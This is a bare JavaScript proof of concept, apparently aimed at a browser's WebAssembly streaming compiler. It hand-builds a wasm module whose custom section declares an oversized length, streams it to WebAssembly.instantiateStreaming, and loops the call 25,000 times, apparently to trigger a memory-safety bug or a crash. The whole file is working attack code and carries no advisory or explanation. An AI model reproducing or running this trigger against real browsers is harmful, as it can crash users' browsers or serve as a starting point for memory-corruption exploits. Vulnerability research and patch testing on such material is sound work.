function poc() {
    let flag = false;

    function trigger() {
        const huge_size = 0x4000000A;

        function leb128(n) {
            const bytes = [];
            do {
                let byte = n & 0x7f;
                n >>>= 7;
                if (n !== 0) {
                    byte |= 0x80;
                }
                bytes.push(byte);
            } while (n !== 0);
            return bytes;
        }

        const part1 = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
            0x00,
            ...leb128(huge_size),
            0x01, 0x78
        ]);

        const part2 = new Uint8Array([
            0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
            0x03, 0x02, 0x01, 0x00,
            0x06,
            0x06,
            0x01,
            0x7f, 0x00,
            0x41, 0x2a,
            0x0b,
            0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b,
        ]);

        const stream = new ReadableStream({
            start(controller) {
                controller.enqueue(part1);
                controller.enqueue(part2);
                controller.close();
            }
        });

        const response = new Response(stream, {
            headers: {
                "Content-Type": "application/wasm"
            }
        });
        try {
            WebAssembly.instantiateStreaming(response, {});
        } catch (e) {}
    }

    for (let i = 0; i < 25000; ++i) {
        trigger();
    }
}
poc();